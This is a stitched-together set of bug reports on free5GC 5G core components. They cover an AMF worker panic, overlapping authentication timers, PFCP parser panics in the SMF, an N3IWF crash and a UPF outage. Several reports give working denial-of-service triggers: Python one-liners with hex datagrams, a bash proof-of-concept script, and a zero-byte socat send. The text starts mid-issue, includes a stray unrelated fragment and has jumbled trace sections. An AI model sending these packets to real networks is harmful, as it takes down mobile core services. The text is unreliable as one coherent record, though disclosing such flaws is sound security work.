3. Non-UE messages (NGSetupRequest, NGResetRequest) should not be hardcoded to Worker 0; they should use round-robin or random distribution to avoid single-point-of-failure.

## Observed behavior

AMF log shows 4 Worker deaths.
After Worker 0 dies:
- All `NGSetupRequest` messages are silently dropped (dispatched to dead Worker 0's buffer)
- New gNB associations SCTP-connect successfully but never receive `NGSetupResponse`
- UE messages routing to dead Workers (hash collision) are silently lost
- AMF process shows no error for the dropped messages
- The process continues running — monitoring systems see AMF as "healthy"

## Root cause

### 1. Worker dies permanently (no restart)

In `NFs/amf/internal/ngap/scheduler.go`, `Worker.run()`:

```go
func (w *Worker) run() {
    defer func() {
        if p := recover(); p != nil {
            logger.NgapLog.Errorf("Worker %d panic: %v", w.ID, p)
            // ← No restart logic. run() returns, goroutine exits forever.
        }
        w.wg.Done()
    }()
    // ... message processing loop
}
```

After panic, `run()` returns → goroutine exits → Worker is dead. No code creates a replacement Worker.

### 2. Dead Worker's buffer becomes a black hole

`Worker.Submit()`:
```go
func (w *Worker) Submit(task Task) bool {
    select {
    case w.taskChan <- task:   // Dead Worker still accepts (buffer not full)
        return true
    case <-w.stopChan:         // Never fires (stopChan not closed)
        return false
    }
}
```

`stopChan` is only closed by `Worker.Stop()`, which is only called during graceful shutdown. After a panic death, `stopChan` remains open, so `Submit()` returns `true` for the first 4096 messages — they enter the buffer and are never consumed. After the buffer fills, `Submit()` blocks the caller (the `handleConnection` goroutine) permanently.

### 3. Worker 0 single-point-of-failure

In `NFs/amf/internal/ngap/service/service.go`, `dispatchToWorkerPool()` (line 307–311):
```go
if !found {
    logger.NgapLog.Tracef("Non-UE message or UE ID not found, using default worker (0)")
    ueID = 0  // → hash(0) = 0 % 8 = Worker 0
}
```

All non-UE messages (NGSetupRequest, NGResetRequest, etc.) are hardcoded to Worker 0. Killing Worker 0 blocks all new gNB registrations.

## Environment
- free5GC Version: v4.3.0
- OS: Ubuntu 22.04.5 LTS
- Kernel version: 6.8.0-71-generic
- go version: 1.21.8
- UERANSIM Version: v3.2.6

## Trace Files
### Configuration Files
Default free5gc configuration.

### PCAP File
[free5gc-v4.3.0-bug.zip](https://github.com/user-attachments/files/34219549/free5gc-v4.3.0-bug.zip)

### Log File
```
2026-10-30T09:21:58.696460548Z[36m [INFO][AMF][Ngap] [0mWorker 0 started
2026-10-30T09:21:58.696471244Z[36m [INFO][AMF][Ngap] [0mWorker 7 started
2026-10-30T09:21:58.696490221Z[36m [INFO][AMF][Ngap] [0mWorker 5 started
2026-10-30T09:21:58.696467744Z[36m [INFO][AMF][Ngap] [0mWorker 2 started
2026-10-30T09:21:58.696500242Z[36m [INFO][AMF][Ngap] [0mWorker 4 started
2026-10-30T09:21:58.696483794Z[36m [INFO][AMF][Ngap] [0mWorker 3 started
2026-10-30T09:21:58.696494754Z[36m [INFO][AMF][Ngap] [0mWorker 6 started
2026-10-30T09:21:58.696575783Z[36m [INFO][AMF][Ngap] [0mWorker 1 started
2026-10-30T09:22:15.168489489Z[31m [ERRO][AMF][Ngap] [0mWorker 2 panic: runtime error: invalid memory address or nil pointer dereference
2026-10-30T09:22:21.820808458Z[31m [ERRO][AMF][Ngap] [0mWorker 4 panic: runtime error: invalid memory address or nil pointer dereference
2026-10-30T09:22:28.475467248Z[31m [ERRO][AMF][Ngap] [0mWorker 6 panic: runtime error: invalid memory address or nil pointer dereference
2026-10-30T09:22:35.132743097Z[31m [ERRO][AMF][Ngap] [0mWorker 0 panic: runtime error: invalid memory address or nil pointer dereference

```

## Suggested fix

```go
// Worker.run() with automatic restart on panic
func (w *Worker) run() {
    logger.NgapLog.Infof("Worker %d started", w.ID)
    defer w.wg.Done()

    for {
        func() {
            defer func() {
                if p := recover(); p != nil {
                    logger.NgapLog.Errorf("Worker %d recovered from panic (restarting): %v", w.ID, p)
                }
            }()
            for {
                select {
                case task := <-w.taskChan:
                    w.handler(task.Conn, task.Message)
                case <-w.stopChan:
                    return
                }
            }
        }()
        select {
        case <-w.stopChan:
            w.drainAndExit()
            return
        default:
            // Continue to next iteration (restart after panic)
        }
    }
}
```

items.title: [Bugs] AMF starts overlapping T3560 timers after repeated IdentityResponse-triggered Authentication Restart
items.body:
## Bug Decription

During an initial registration flow using a GUTI identity, free5GC AMF may start overlapping T3560 timers when repeated `IdentityResponse` messages are handled in the `Authentication` state.

In the reproduced run, each repeated `IdentityResponse` triggered `Authentication Restart`, AMF sent a new `AuthenticationRequest`, and AMF started a new T3560 timer. However, no `Stop T3560 timer` log was observed between these timer starts. Afterwards, multiple T3560 instances expired independently, causing repeated/staggered `AuthenticationRequest` retransmissions for the same UE context.

I am reporting this as a NAS/GMM timer lifecycle and state-handling bug. I have not established a security impact.

## To Reproduce

Steps to reproduce the behavior:

1. Use a local free5GC v4.2.1 test setup with a normal test subscriber.

2. Use the existing state-learning UE harness / modified UERANSIM setup to execute the following logical sequence in interactive mode. The same minimal harness patch used for issue #1151 is attached as:

[free5gc-smrej-sht2-repro.zip](https://github.com/user-attachments/files/31420409/free5gc-smrej-sht2-repro.zip)

   This T3560 reproducer does not rely on the SHT=2 `SecurityModeReject` MDF branch; it only needs the harness ability to replay/send stored NAS messages such as `IdentityResponse`.

   Execute:

   ```text
   registrationRequestGUTI identityResponse identityResponse identityResponse
   ```

   This run intentionally sends repeated `IdentityResponse` messages while AMF remains in the `Authentication` state, after AMF first requests identity due to the GUTI registration path.

3. Start free5GC normally, start the modified UE/gNB harness, then run SeqTest in interactive mode:

   ```bash
   java -jar Corelearner_SeqTest.jar core.properties
   ```

4. Capture packets while reproducing:

   ```bash
   sudo tcpdump -i any -s 0 -w free5gc-t3560-overlap.pcap
   ```

5. Observe the following AMF log behavior in the reproduced run.

   Repeated `IdentityResponse` triggers repeated Authentication Restart and repeated T3560 start:

   ```text
   2026-08-25T04:54:50.327 Handle Identity Response
   2026-08-25T04:54:50.327 Handle event[Authentication Restart], transition from [Authentication] to [Authentication]
   2026-08-25T04:54:50.373 Send Authentication Request
   2026-08-25T04:54:50.373 Start T3560 timer
   
   2026-08-25T04:54:50.876 Handle Identity Response
   2026-08-25T04:54:50.876 Handle event[Authentication Restart], transition from [Authentication] to [Authentication]
   2026-08-25T04:54:50.898 Send Authentication Request
   2026-08-25T04:54:50.898 Start T3560 timer
   
   2026-08-25T04:54:51.405 Handle Identity Response
   2026-08-25T04:54:51.405 Handle event[Authentication Restart], transition from [Authentication] to [Authentication]
   2026-08-25T04:54:51.427 Send Authentication Request
   2026-08-25T04:54:51.427 Start T3560 timer
   ```

   No `Stop T3560 timer` log appears between these three starts.

   Afterwards, the timers expire in three staggered groups:

   ```text
   2026-08-25T04:54:56.374 T3560 expires, retransmit Authentication Request (retry: 1)
   2026-08-25T04:54:56.899 T3560 expires, retransmit Authentication Request (retry: 1)
   2026-08-25T04:54:57.428 T3560 expires, retransmit Authentication Request (retry: 1)
   
   2026-08-25T04:55:02.378 T3560 expires, retransmit Authentication Request (retry: 2)
   2026-08-25T04:55:02.899 T3560 expires, retransmit Authentication Request (retry: 2)
   2026-08-25T04:55:03.428 T3560 expires, retransmit Authentication Request (retry: 2)
   
   2026-08-25T04:55:08.374 T3560 expires, retransmit Authentication Request (retry: 3)
   2026-08-25T04:55:08.898 T3560 expires, retransmit Authentication Request (retry: 3)
   2026-08-25T04:55:09.428 T3560 expires, retransmit Authentication Request (retry: 3)
   
   2026-08-25T04:55:14.373 T3560 expires, retransmit Authentication Request (retry: 4)
   2026-08-25T04:55:14.898 T3560 expires, retransmit Authentication Request (retry: 4)
   2026-08-25T04:55:15.428 T3560 expires, retransmit Authentication Request (retry: 4)
   ```

   Finally, the abort message appears three times:

   ```text
   2026-08-25T04:55:20.374 T3560 Expires 4 times, abort authentication procedure & ongoing 5GMM procedure
   2026-08-25T04:55:20.898 T3560 Expires 4 times, abort authentication procedure & ongoing 5GMM procedure
   2026-08-25T04:55:21.428 T3560 Expires 4 times, abort authentication procedure & ongoing 5GMM procedure
   ```

## Expected Behavior

When AMF restarts the authentication procedure and sends a new `AuthenticationRequest`, it should not leave the previously active T3560 timer running for the same UE authentication procedure.

Before replacing the stored T3560 timer reference, AMF should stop the old active timer or otherwise ensure that only the latest valid T3560 instance can retransmit and abort the ongoing procedure.

## Screenshots

N/A.

## Environment

Please, complete the following information:

- free5GC Version: v4.2.1-dirty, root commit `52d9545faa42efca71b1567cf7d5c5afca79f490`
- AMF Version: NFs/amf v1.4.2, commit `92b7a3f85764b21b5a94204afc2fb1effff5ed15`
- OS: Ubuntu 20.04.6 LTS
- Kernel version: 5.15.0-139-generic
- go version: go1.24.5 linux/amd64
- C compiler version: gcc 9.4.0

The free5GC tree was dirty due to local certificate/runtime helper/config files:

```text
 M cert/nrf.pem
?? cert/af.pem
?? config.zip
?? kill_core.sh
```

The AMF submodule itself was clean at v1.4.2.

## Trace Files

### Configuration Files

Attached:

[config-sanitized.zip](https://github.com/user-attachments/files/31420420/config-sanitized.zip)

This is the sanitized local free5GC v4.2.1 test configuration. Private keys, RadiusSecret, and non-essential subscriber values were redacted or replaced with public test placeholders.

### PCAP File

Attached:

[free5gc-t3560-overlap.pcap.zip](https://github.com/user-attachments/files/31420424/free5gc-t3560-overlap.pcap.zip)

The PCAP covers the reproduced window from approximately `2026-08-25T11:54:37Z` to `2026-08-25T11:57:14Z`.

### Log File

Attached:

[free5gc-t3560-logs-and-traces.zip](https://github.com/user-attachments/files/31420431/free5gc-t3560-logs-and-traces.zip)

The archive contains:

```text
free5gc.log
ue.log
gnb.log
runs/20260825T115436Z-15aa098b/statelearner_trace.jsonl
runs/20260825T115436Z-15aa098b/protocol-events.jsonl
runs/20260825T115436Z-15aa098b/core-events.jsonl
runs/20260825T115436Z-15aa098b/ue-events.jsonl
runs/20260825T115436Z-15aa098b/run-manifest.json
runs/20260825T115436Z-15aa098b/raw/console.log
runs/20260825T115436Z-15aa098b/raw/free5gc/core-session-001/launcher.log
```

`core-events.jsonl` is empty in this run, but it is included to preserve the generated run directory structure.

## System Architecture (Optional)

Local VM-based free5GC test environment with UERANSIM gNB/UE. The modified UE is used as a state-learning/message-injection harness to send repeated NAS inputs and observe AMF behavior. The observed timer behavior is in free5GC AMF.

## Walkthrough (Optional)

This finding was observed during AMF NAS/GMM state-machine analysis.

Source-level inspection suggests the likely pattern is that `SendAuthenticationRequest` assigns a new timer to the UE context field, while the previous active timer is not stopped before the field is overwritten. If repeated `IdentityResponse` messages trigger `Authentication Restart`, multiple T3560 timers can remain active and later retransmit independently.

Relevant source areas:

```text
NFs/amf/internal/gmm/sm.go
NFs/amf/internal/gmm/message/send.go
NFs/amf/internal/context/amf_ue.go
```


Static inspection of the latest source also suggests that similar repeated timer-reference overwrite patterns may exist in other NAS procedures/timers, but I have not dynamically tested those cases yet. I am mentioning this only as a possible related pattern, not as reproduced evidence in this issue.
In particular, the reproduced behavior is consistent with:

- `IdentityResponse` being accepted in the `Authentication` state and triggering `Authentication Restart`.
- `SendAuthenticationRequest` creating a new T3560 timer for the UE context.
- `StopT3560()` stopping only the timer currently referenced by the UE context field.
- Older timer instances continuing to run after the stored reference has been overwritten.

## Additional Context

This is separate from issue #1151. Issue #1151 concerns SecurityModeReject / ServiceRequest handling after rejected Security Mode Control. This issue concerns repeated T3560 setup and timer lifecycle handling during Authentication Restart.

I have not established whether this timer behavior has a security impact. At minimum, it appears to cause unexpected duplicate retransmissions and multiple abort callbacks for one UE authentication flow.

## Describe the bug
Free5GC OAuth2 authentication fails when using certificates generated by OpenBao (HashiCorp Vault fork) PKI engine, but works correctly with the pre-generated certificates included in the repository.

items.title: [Bugs] SMF exits on a single unauthenticated PFCP Association Setup Request with empty FQDN Node ID
items.body:
## Bug Decription

A single 13-byte UDP datagram sent to the SMF's N4/PFCP port (8805/udp), with no authentication, terminates the SMF process in free5GC v4.2.3. Reproduced on the official v4.2.3 Docker deployment.

This is distinct from the previously reported 4-byte PFCP panic in #1158. It reaches a different code path in `github.com/free5gc/pfcp@v1.1.2`: `pfcpType.rfc1035tofqdn()` via `NodeID.UnmarshalBinary()`.

The datagram `20 05 00 09 00 00 01 00 00 3c 00 01 02` decodes as a PFCP Association Setup Request containing a Node ID IE with `NodeIdType = FQDN` and an empty FQDN body.

Observed panic:

```text
panic: runtime error: slice bounds out of range [:-1]
github.com/free5gc/pfcp/pfcpType.rfc1035tofqdn(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/util.go:87
github.com/free5gc/pfcp/pfcpType.(*NodeID).UnmarshalBinary(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/NodeID.go:97
```

Root cause: `NodeID.UnmarshalBinary()` accepts a FQDN-typed Node ID whose remaining FQDN body is empty. It passes that empty byte slice to `rfc1035tofqdn()`. The converter leaves `fqdn == ""` and then unconditionally returns `fqdn[0:len(fqdn)-1]`, producing a negative slice upper bound.

Relevant code:

```go
// pfcpType/NodeID.go
case NodeIdTypeFqdn:
    rfc1035RR := data[idx:]
    n.FQDN = rfc1035tofqdn(rfc1035RR)

// pfcpType/util.go
return fqdn[0 : len(fqdn)-1]
```

The `recover()` path catches the panic but logs it as fatal and the SMF process exits, so a malformed network packet becomes a full SMF outage.

I re-verified this on 2026-09-14 against the local `free5gc-smf-1` container. The target recovered before each shot, and the current Docker-assigned SMF IP was used at send time.

| Input | Bytes | RestartCount | Result |
|---|---:|---:|---|
| C-03 positive control | 4 | 0 → 1 | CRASH |
| R5-4-1 | 13 | 1 → 2 | CRASH |

## To Reproduce

1. Deploy free5GC v4.2.3 with the official Docker deployment. No source patch is needed. The SMF must be reachable on its N4/PFCP address, UDP/8805.
2. From any host/container that can route to the SMF's 8805/udp, send the datagram below:

   ```bash
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(bytes.fromhex('2005000900000100003c000102'),('<SMF_N4_IP>',8805))"
   ```

3. Observe the panic in `docker logs <smf container>` and the SMF container restart.

## Expected Behavior

Malformed PFCP messages should be rejected with a parse error and dropped. A single malformed datagram must not terminate the SMF process.

For FQDN decoding, empty FQDN bodies and malformed label lengths should be rejected before converting. `rfc1035tofqdn()` should return an error rather than slicing the accumulated string unconditionally.

## Screenshots

Not applicable (headless containers).

## Environment

- free5GC Version: v4.2.3, official prebuilt Docker images
- Affected library: `github.com/free5gc/pfcp@v1.1.2`
- OS: Ubuntu 22.04.5 LTS host, Docker deployment
- Kernel version: 6.8.0-138-generic
- go version: runtime images ship no Go toolchain; the affected module is `github.com/free5gc/pfcp@v1.1.2`
- C compiler version (optional): n/a for this path

## Trace Files

### Configuration Files

Unmodified free5GC v4.2.3 Docker deployment. Relevant SMF PFCP/N4 listener configuration is the default `smfcfg.yaml` PFCP section for the container deployment.

### PCAP File

Not attached. The trigger datagram is shown in full above:

```text
2005000900000100003c000102
```

### Log File

Representative panic signature:

```text
panic: runtime error: slice bounds out of range [:-1]
github.com/free5gc/pfcp/pfcpType.rfc1035tofqdn(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/util.go:87
```

## System Architecture (Optional)

Local container lab only. No traffic was sent to any system outside the lab. The demonstrated attacker model is any host that can route to the SMF's N4/PFCP port, UDP/8805.

## Walkthrough (Optional)

This input was found while fuzzing and replaying PFCP parser paths in `github.com/free5gc/pfcp@v1.1.2`, then verified with a single live datagram against the SMF. It is related to #1158 only in that it is in the same shared PFCP library and leads to the same process-level outcome. It does not use the same crash site:

- #1158: `pfcp@v1.1.2/decode.go:111`, derived PFCP header length exceeds the actual datagram length.
- This issue: `pfcpType/util.go:87`, empty FQDN conversion slices `fqdn[0:-1]`.

Suggested fixes:

1. Make `rfc1035tofqdn()` validate empty and malformed inputs and return an error.
2. Propagate that error through `NodeID.UnmarshalBinary()` instead of panicking.
3. Ensure parser panics from malformed network input cannot terminate the NF process.

## Additional Context

I searched existing issues before filing. The closest prior report is #1158, but this input reaches a different parser code path and should be fixed separately.

items.title: [Bugs] SMF exits on single unauthenticated PFCP Session Establishment Requests due to uint16 IE length-wrap panics
items.body:
## Bug Decription

Two additional single UDP datagrams sent to the SMF's N4/PFCP port (8805/udp), with no authentication, terminate the SMF process in free5GC v4.2.3. Reproduced on the official v4.2.3 Docker deployment.

These are distinct from the previously reported 4-byte PFCP panic in #1158. They reach different IE decoders in `github.com/free5gc/pfcp@v1.1.2`, and both have length-consistent PFCP message headers, so they are not stopped by the outer `MessageLength == len(data)-4` check.

Both issues have the same root-cause pattern: a parser keeps `idx`, `length`, and an attacker-controlled field length as `uint16`, checks `length < idx + fieldLength`, and then slices with `data[idx : idx+fieldLength]`. A large field length such as `0xffff` makes the addition wrap, so the guard succeeds and the following slice has an upper bound smaller than the lower bound.

### R5-4-2 — SDF Filter flow-description length wrap

The datagram `21 32 00 1c 00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 0c 00 02 00 08 00 17 00 04 31 30 ff ff` decodes as a PFCP Session Establishment Request containing a nested SDF Filter IE.

Observed panic:

```text
panic: runtime error: slice bounds out of range [4:3]
github.com/free5gc/pfcp/pfcpType.(*SDFFilter).UnmarshalBinary(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/SDFFilter.go:124
```

Root cause: with `idx == 4` and `LengthOfFlowDescription == 0xffff`, `idx + s.LengthOfFlowDescription` wraps to `3`. The length guard therefore does not reject the input, and the next line slices `data[4:3]`.

Relevant code:

```go
s.LengthOfFlowDescription = binary.BigEndian.Uint16(data[idx:])
idx = idx + 2

if length < idx+s.LengthOfFlowDescription {
    return fmt.Errorf("inadequate TLV length: %d", length)
}
s.FlowDescription = data[idx : idx+s.LengthOfFlowDescription]
```

### R5-4-3 — Redirect Information address length wrap

The datagram `21 32 00 1b 00 00 00 00 00 00 00 00 00 00 01 00 00 03 00 0b 00 04 00 07 00 26 00 03 00 ff ff` decodes as a PFCP Session Establishment Request containing a nested Redirect Information IE.

Observed panic:

```text
panic: runtime error: slice bounds out of range [3:2]
github.com/free5gc/pfcp/pfcpType.(*RedirectInformation).UnmarshalBinary(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/RedirectInformation.go:60
```

Root cause: with `idx == 3` and `RedirectServerAddressLength == 0xffff`, `idx + r.RedirectServerAddressLength` wraps to `2`. The length guard therefore does not reject the input, and the next line slices `data[3:2]`.

Relevant code:

```go
r.RedirectServerAddressLength = binary.BigEndian.Uint16(data[idx:])
idx = idx + 2

if length < idx+r.RedirectServerAddressLength {
    return fmt.Errorf("inadequate TLV length: %d", length)
}
r.RedirectServerAddress = data[idx : idx+r.RedirectServerAddressLength]
```

In both cases, the `recover()` path catches the panic but logs it as fatal and the SMF process exits, so a malformed network packet becomes a full SMF outage.

I re-verified these on 2026-09-14 against the local `free5gc-smf-1` container. The target recovered before each shot, and the current Docker-assigned SMF IP was used at send time.

| Input | Bytes | RestartCount | Result |
|---|---:|---:|---|
| C-03 positive control | 4 | 0 → 1 | CRASH |
| R5-4-2 | 32 | 2 → 3 | CRASH |
| R5-4-3 | 31 | 3 → 4 | CRASH |

## To Reproduce

1. Deploy free5GC v4.2.3 with the official Docker deployment. No source patch is needed. The SMF must be reachable on its N4/PFCP address, UDP/8805.
2. From any host/container that can route to the SMF's 8805/udp, send one of the datagrams below:

   ```bash
   # R5-4-2: SDF Filter length wrap, 32 bytes
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(bytes.fromhex('2132001c0000000000000000000001000001000c00020008001700043130ffff'),('<SMF_N4_IP>',8805))"

   # R5-4-3: Redirect Information length wrap, 31 bytes
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(bytes.fromhex('2132001b0000000000000000000001000003000b000400070026000300ffff'),('<SMF_N4_IP>',8805))"
   ```

3. Observe the panic in `docker logs <smf container>` and the SMF container restart.

## Expected Behavior

Malformed PFCP messages should be rejected with a parse error and dropped. A single malformed datagram must not terminate the SMF process.

The IE decoders should avoid overflow-prone bounds checks such as `length < idx + fieldLength`. A safer pattern is to convert to `int` and check the remaining buffer, for example `int(fieldLength) <= len(data)-int(idx)`, before slicing.

## Screenshots

## Environment

- Affected library: `github.com/free5gc/pfcp@v1.1.2`
- OS: Ubuntu 22.04.5 LTS host, Docker deployment

### PCAP File

Not attached. The two trigger datagrams are shown in full above:

```text
R5-4-3: 2132001b0000000000000000000001000003000b000400070026000300ffff
```

```text
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/SDFFilter.go:124
```

```text
panic: runtime error: slice bounds out of range [3:2]
github.com/free5gc/pfcp/pfcpType.(*RedirectInformation).UnmarshalBinary(...)
```

These inputs were found while fuzzing and replaying PFCP parser paths in `github.com/free5gc/pfcp@v1.1.2`, then verified with single live datagrams against the SMF. items.title: [Bugs] N3IWF CREATE_CHILD_SA handler panics on empty Proposals array without length check, causing DoS
items.body:
## Bug Decription

A remote, authenticated attacker can crash the `N3IWF` process by replying to a production `CREATE_CHILD_SA` request with a `SecurityAssociation` payload whose `Proposals` list is empty. `continueCreateChildSA()` accesses `temporaryIkeMsg.SecurityAssociation.Proposals[0].SPI` without verifying that the slice is non-empty, which causes an immediate panic in the live IKE handler path.

Crash site in `n3iwf/internal/ike/handler.go`:

```go
outboundSPI := binary.BigEndian.Uint32(
    temporaryIkeMsg.SecurityAssociation.Proposals[0].SPI)
```

The upstream IKE SA payload parser accepts empty proposal lists, and the handler checks `securityAssociation != nil` but does not check `len(Proposals) > 0`.

## To Reproduce

Steps to reproduce the behavior:

1. Prepare a live free5GC `v4.2.1` lab with `N3IWF`, `UPF`, `amf`, and `n3iwue`, and make sure the host has the `gtp5g` kernel module loaded.
2. Run command `test_n3iwf_create_child_empty_proposals_fatal_dos.sh`.
3. The script restarts `amf` and `n3iwf`, builds the live helper image, completes `EAP-AKA' + IKE + NAS + PDU Session`, waits until `N3IWF` emits a production `CREATE_CHILD_SA`, and then replies with a `SecurityAssociation` payload whose `Proposals` list is empty.
4. During live Docker validation on `2026-04-04 UTC`, the helper output confirmed `final_auth_succeeded`, `nas_tcp_connected`, `sent_pdu_session_request`, `observed_server_create_child_sa`, and `sent_empty_proposal_response`, after which `n3iwf` changed from `status=running running=true restart=0 exit=0` to `status=exited running=false restart=0 exit=1` with `finished=2026-04-04T09:39:33.639800991Z`.

Validated live reproduction command:

```bash
test_n3iwf_create_child_empty_proposals_fatal_dos.sh
```

PoC script used in live Docker validation:

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="/home/ubuntu/free5gc_v421/free5gc"
TEST_ROOT="$REPO_ROOT/test"
BUILD_DIR="/tmp/n3iwf-create-child-empty-proposals"
IMAGE_TAG="n3iwf-create-child-empty-proposals:latest"
RUN_NAME="n3iwf-create-child-empty-proposals-run"
BIN_PATH="$TEST_ROOT/n3iwf_create_child_empty_proposals_driver"

restore_n3iwf() {
  docker restart n3iwf >/dev/null 2>&1 || true
}

trap restore_n3iwf EXIT

cd "$REPO_ROOT"

echo "[*] restarting amf and n3iwf"
docker restart amf >/dev/null
docker restart n3iwf >/dev/null
sleep 3

echo "[*] status before trigger"
docker inspect n3iwf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

start_ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[*] trigger timestamp: $start_ts"

echo "[*] building live driver"
mkdir -p "$BUILD_DIR"
(
  cd "$TEST_ROOT"
  GOCACHE=/tmp/go-build GOMODCACHE=/tmp/go-mod-cache go build -o "$BIN_PATH" ./cmd/n3iwf_create_child_empty_proposals_driver
)
cp "$BIN_PATH" "$BUILD_DIR/"
cat >"$BUILD_DIR/Dockerfile" <<'EOF'
FROM free5gc/n3iwue:latest
COPY n3iwf_create_child_empty_proposals_driver /n3iwf_create_child_empty_proposals_driver
ENTRYPOINT ["/n3iwf_create_child_empty_proposals_driver"]
EOF

echo "[*] building helper image"
docker build --no-cache -t "$IMAGE_TAG" "$BUILD_DIR" >/tmp/n3iwf_create_child_empty_proposals_build.log

echo "[*] running empty-proposals PoC"
docker rm -f "$RUN_NAME" >/dev/null 2>&1 || true
docker run --rm --name "$RUN_NAME" --network free5gc-compose_privnet --cap-add NET_ADMIN --cap-add NET_RAW "$IMAGE_TAG"

sleep 1

echo "[*] status after trigger"
docker inspect n3iwf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

echo "[*] recent n3iwf logs"
docker logs --since "$start_ts" --tail 160 n3iwf 2>&1

echo "[*] restoring n3iwf"
docker restart n3iwf >/dev/null
```

## Expected Behavior

`N3IWF` should reject a `CREATE_CHILD_SA` response whose `SecurityAssociation.Proposals` list is empty, return an appropriate IKE error such as `NO_PROPOSAL_CHOSEN`, and never access `Proposals[0]` without checking `len(Proposals) > 0`.

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`
- runtime N3IWF build: `commit hash 8fc08a09`, `go1.25.5 linux/amd64`
- Requires: `gtp5g` kernel module

items.title: [Bugs] UPF stops serving PFCP entirely on a single zero-byte UDP datagram to 8805 (read loop exits with "pfcp server stopped"; clean ExitCode=0 leaves no crash signature)
items.body:
## Bug Decription

A single **zero-length** UDP datagram sent to the UPF's PFCP port (8805/udp), with no
authentication, makes the UPF's PFCP server stop listening. The UPF stops answering PFCP
Heartbeat Requests and all N4 traffic; reproduced **3/3**. The same datagram has no effect on
free5GC's own SMF, on OpenAirInterface's UPF/SMF, or on Open5GS's UPF/SMF, so this is specific to
the UPF's PFCP server loop.

Observed sequence per repetition (timestamps from `docker logs`, 2026-09-05):

```
...T06:05:21.260412950Z [INFO][UPF][PFCP][LAddr:upf.free5gc.org:8805] handleHeartbeatRequest   <- last heartbeat answered
...T06:05:22.884449138Z [INFO][UPF][PFCP][LAddr:upf.free5gc.org:8805] pfcp server stopped      <- zero-byte datagram received here
(no further response to heartbeats; container restarted ~15 s later, RestartCount 2 -> 3)
```

The same three repetitions produced `RestartCount` 2→3, 3→4, 4→5, i.e. the container does restart —
but only **after** an outage window (≈70 s in a separate calibration run, <30 s in this sweep), and
the process then exits with **`ExitCode=0`, `OOMKilled=false`**. The combination makes the event
invisible to ordinary monitoring:

- during the outage window `docker inspect` reports `State.Status = running`, port 8805 is still
  bound, and `RestartCount` has not incremented yet;
- the container has `Health = none`, so no healthcheck observes the outage;
- after the window the exit is clean (code 0, no panic, no signal), so nothing looks like a crash;
  the only traces are the `pfcp server stopped` log line and the incremented `RestartCount`.

Contrast — how the same zero-byte datagram is handled elsewhere:

| Target | Behaviour |
|---|---|
| free5GC **SMF** | `[WARN][SMF][PFCP] Read PFCP error: pfcp: unmarshal msg failed` — datagram dropped, service continues |
| OAI UPF / SMF | `[udp] [error] Recvfrom failed Success` — error logged, heartbeats still answered |
| Open5GS UPF / SMF | no effect |
| free5GC **UPF** | **PFCP server stops; service lost until the container restarts** |

Impact: every PFCP association to that UPF is lost; PDU session establishment, modification and
deletion all fail, and sessions established before the event lose their forwarding state when the
UPF comes back. The interruption is self-healing only because of the Docker `restart` policy.

## To Reproduce

1. Deploy free5GC v4.2.3 with the official docker-compose (no config changes; default
   `upfcfg.yaml`, PFCP listening on the UPF's N4 address).
2. From any host/container that can route to the UPF's 8805/udp (in our lab: the `pentest-client`
   container on the compose network), send one empty datagram:

   ```bash
   printf '' | socat - UDP-DATAGRAM:<UPF_N4_IP>:8805
   # or:
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(b'',('<UPF_N4_IP>',8805))"
   ```

3. Send a PFCP Heartbeat Request before and after (`20 01 00 0c 00 d9 00 00 00 60 00 04 01 02 03 04`):
   before the shot the UPF answers with a 16-byte Heartbeat Response; after the shot there is no
   response at all, and the container log shows `pfcp server stopped`.
4. No packet capture needed: the trigger is a zero-byte datagram.

## Expected Behavior

A zero-length datagram should be treated as an empty (malformed) packet: log it at WARN/ERROR and
continue the read loop, exactly as the SMF does. The PFCP server must not exit its listen loop on a
transport-layer condition, and the UPF should keep serving N4.

## Screenshots

Not applicable (headless containers).

## Environment

- free5GC Version: v4.2.3 (official prebuilt image `free5gc/upf:v4.2.3`)
- OS: Ubuntu 22.04.5 LTS (host), Docker deployment
- Kernel version: 6.8.0-138-generic
- go version: 1.26.2 (official builder image `golang:1.26.2-trixie`; runtime images ship no toolchain)
- C compiler version (optional): n/a for this path

## Trace Files

### Configuration Files

Unmodified defaults; relevant excerpt of `config/upfcfg.yaml`:

```yaml
pfcp:
  addr: 127.0.0.8      # N4 listen address (container-internal in our lab)
  nodeID: 127.0.0.8
```

### PCAP File

Not attached: the trigger is a zero-byte datagram (no payload to capture).

### Log File

Excerpt in "Bug Decription" above; three repetitions on 2026-09-05, each gated by a readiness check
(container running, port bound, process age) and each confirmed by a before/after liveness probe.
`RestartCount` deltas 2→3, 3→4, 4→5; exit code 0, `OOMKilled=false`.

## System Architecture (Optional)

Local container lab only (three 5G cores side by side, 58 containers, 5 Docker networks, UERANSIM
UE/gNB). No traffic was sent to any system outside the lab. The N4 port is not published outside
the host; the demonstrated attacker model is "any host that can route to 8805/udp", which in a
typical deployment includes every NF on the core network and any compromised SMF.

## Walkthrough (Optional)

Found while calibrating liveness oracles for an unrelated test: the UPF kept going silent although
every readiness check passed. Attribution was established by re-sending each candidate datagram
**alone** (zero-byte, one-byte `0x20`, 8-byte truncated header) with liveness probes before and
after; only the zero-byte datagram reproduces the effect. Two suggestions:

1. Treat a zero-length read as an empty datagram and `continue` the read loop instead of exiting it.
